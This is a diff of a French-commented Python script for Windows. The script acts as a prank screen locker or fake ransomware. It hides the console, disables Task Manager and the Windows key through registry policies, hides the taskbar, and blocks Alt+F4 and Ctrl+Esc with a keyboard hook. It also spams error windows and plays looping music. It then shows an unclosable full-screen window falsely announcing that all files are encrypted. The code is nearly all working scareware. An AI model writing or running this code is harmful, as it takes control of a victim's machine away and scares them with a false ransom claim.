@@ -1,80 +1,66 @@
-#### DONT TRY THIS
-
 import ctypes
-whnd = ctypes.windll.kernel32.GetConsoleWindow()
-if whnd != 0:
-    ctypes.windll.user32.ShowWindow(whnd, 0)
 import os
+import sys
+import threading
 import tkinter as tk
 from tkinter import messagebox
 from PIL import Image, ImageTk
-import os
-os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
 import winreg
 import win32gui
 import win32con
-import win32api
-import win32process
-import time
 import shutil
-import sys
-import time
-import threading
 from pynput import keyboard
-
 import pygame
+
+# Cache la console Windows direct
+def hide_console():
+    whnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if whnd != 0:
+        ctypes.windll.user32.ShowWindow(whnd, 0)
 
 def play_music_loop():
     pygame.mixer.init()
     pygame.mixer.music.load("music.mp3")
-    pygame.mixer.music.set_volume(1.0)  # Volume max
-    pygame.mixer.music.play(-1)  # -1 pour boucle infinie
-    
-    # On bloque le thread pour pas que ça se coupe
-    try:
-        while True:
-            pygame.time.Clock().tick(10)
-    except KeyboardInterrupt:
-        pass  # Pour éviter la fermeture avec Ctrl+C dans la console
-
-#<<
-
+    pygame.mixer.music.set_volume(1.0)
+    pygame.mixer.music.play(-1)  # boucle infinie
+    while True:
+        pygame.time.Clock().tick(10)
 
 def boucle_erreurs_gui():
     root = tk.Tk()
     root.title("bztp la grosse slp ! ya une skibidi erreur ❤️")
     root.geometry("600x400")
-
     text_box = tk.Text(root, bg="black", fg="red", font=("Consolas", 12))
     text_box.pack(expand=True, fill=tk.BOTH)
 
     def spam_errors():
         while True:
             try:
-                1 / 0  # Boom, erreur division par zéro
-            except Exception as e:
-                # Insert error message en bas de la textbox
-                text_box.insert(tk.END, f"Salamalékoum rouya menge ma paffette ! 😇\n")
-                text_box.see(tk.END)  # Scroll automatique vers le bas
-              # Petit délai pour que ça soit lisible
+                1 / 0
+            except Exception:
+                text_box.insert(tk.END, "Salamalékoum rouya menge ma paffette ! 😇\n")
+                text_box.see(tk.END)
+            # Petit sleep pour éviter de flooder à mort
+            import time
+            time.sleep(0.1)
 
-    # Thread pour pas bloquer la GUI
     threading.Thread(target=spam_errors, daemon=True).start()
-
     root.mainloop()
 
 def slideshow_images():
     root = tk.Tk()
-    root.overrideredirect(True)  # Sans barre de tâche
+    root.overrideredirect(True)
     root.attributes("-topmost", True)
-    root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+    root.geometry(f"{screen_width}x{screen_height}+0+0")
 
     images = []
     for i in range(1, 6):
         path = f"skibidi{i}.jpeg"
         if os.path.exists(path):
             img = Image.open(path)
-            img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
+            img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
             images.append(ImageTk.PhotoImage(img))
 
     label = tk.Label(root)
@@ -82,18 +68,18 @@ def slideshow_images():
 
     def update(idx=0):
         label.config(image=images[idx])
-        root.after(2000, lambda: update((idx + 1) % len(images)))  # 2000ms = 2sec
+        root.after(2000, lambda: update((idx + 1) % len(images)))
 
-    update()
-    root.mainloop()
-
+    if images:
+        update()
+        root.mainloop()
 
 def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
     root = tk.Tk()
-    root.overrideredirect(True)  # Pas de barre de tache ni bordure
+    root.overrideredirect(True)
     root.attributes("-topmost", True)
     root.configure(bg="red")
-    
+
     screen_width = root.winfo_screenwidth()
     screen_height = root.winfo_screenheight()
     window_width, window_height = 600, 300
@@ -101,24 +87,14 @@ def show_final_window(main_text="Votre ordinateur est vérouillé !", descriptio
     y = (screen_height - window_height) // 2
     root.geometry(f"{window_width}x{window_height}+{x}+{y}")
 
-    # Texte principal énorme et noir
     main_label = tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red")
     main_label.pack(pady=(40, 10))
 
-    # Description en dessous
     desc_label = tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red")
     desc_label.pack()
 
-    # Interdire fermeture
-    def disable_event():
-        pass
-    root.protocol("WM_DELETE_WINDOW", disable_event)
-
+    root.protocol("WM_DELETE_WINDOW", lambda: None)  # interdit fermeture
     root.mainloop()
-
-
-
-#>>
 
 def is_admin():
     try:
@@ -149,7 +125,8 @@ def hide_taskbar():
         hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
         if hwnd:
             win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
     except Exception as e:
@@ -165,7 +142,6 @@ def disable_task_manager():
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
 
-        # Remplacer PostMessage par SendMessageTimeout pour éviter l'erreur
         win32gui.SendMessageTimeout(
             win32con.HWND_BROADCAST,
             win32con.WM_SETTINGCHANGE,
@@ -176,6 +152,7 @@ def disable_task_manager():
         )
     except Exception as e:
         print(f"Erreur lors de la désactivation du gestionnaire des tâches : {e}")
+
 def set_wallpaper(image_path):
     try:
         full_path = os.path.abspath(image_path)
@@ -200,67 +177,58 @@ def clear_desktop_icons():
         print(f"Erreur lors du nettoyage du bureau : {e}")
 
 def keyboard_hook():
-    pressed_keys = set()  # Suivi des touches enfoncées
+    pressed_keys = set()
 
     def on_press(key):
         try:
-            # Ajouter la touche au set
             pressed_keys.add(key)
-            
-            # Vérifier Alt+F4
-            if (key == keyboard.Key.f4 and 
-                (keyboard.Key.alt in pressed_keys or 
-                 keyboard.Key.alt_l in pressed_keys or 
-                 keyboard.Key.alt_r in pressed_keys)):
-                return False  # Bloquer la touche F4 si Alt est enfoncé
-            
-            # Vérifier Ctrl+Esc
-            if (key == keyboard.Key.esc and 
-                (keyboard.Key.ctrl in pressed_keys or 
-                 keyboard.Key.ctrl_l in pressed_keys or 
-                 keyboard.Key.ctrl_r in pressed_keys)):
-                return False  # Bloquer la touche Esc si Ctrl est enfoncé
-                
+            # Bloque Alt+F4
+            if key == keyboard.Key.f4 and (keyboard.Key.alt in pressed_keys or keyboard.Key.alt_l in pressed_keys or keyboard.Key.alt_r in pressed_keys):
+                return False
+            # Bloque Ctrl+Esc
+            if key == keyboard.Key.esc and (keyboard.Key.ctrl in pressed_keys or keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys):
+                return False
         except Exception as e:
             print(f"Erreur dans le hook clavier (press) : {e}")
-        return True  # Laisser passer les autres touches
+        return True
 
     def on_release(key):
         try:
-            # Retirer la touche du set
-            if key in pressed_keys:
-                pressed_keys.remove(key)
+            pressed_keys.discard(key)
         except Exception as e:
             print(f"Erreur dans le hook clavier (release) : {e}")
-    
-    # Démarrer le listener dans un thread séparé
+
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     return listener
 
 def main():
+    hide_console()
+
     if not is_admin():
-        show_message("Erreur", "Veuillez exécuter ce programme en mode administrateur.", borderless=False)
+        show_message("Erreur", "Exécute en mode admin, sinon c’est mort.", borderless=False)
         sys.exit(1)
-    
+
     loading_window = show_message("Chargement", "Loading...", borderless=True)
-    
-    # Démarrer le hook clavier
+
     listener = keyboard_hook()
-    
-    # Effectuer les actions de verrouillage
+
     hide_taskbar()
     disable_task_manager()
     set_wallpaper("IMG_7832.jpeg")
     clear_desktop_icons()
-    play_music_loop()
-    boucle_erreurs_gui()
+
+    # Met la musique en thread pour pas bloquer
+    threading.Thread(target=play_music_loop, daemon=True).start()
+    # Lancement de la GUI erreurs dans un thread sinon ça bloque
+    threading.Thread(target=boucle_erreurs_gui, daemon=True).start()
+
+    # Affiche la fenêtre finale (bloquante)
     show_final_window()
+
+    # Après la fin de la fenêtre finale, lance le slideshow (bloquant aussi)
     slideshow_images()
-    
-    
-    
-    # Fermer la fenêtre et arrêter le listener après 5 secondes
+
     loading_window.after(5000, lambda: [loading_window.destroy(), listener.stop()])
     loading_window.mainloop()
 
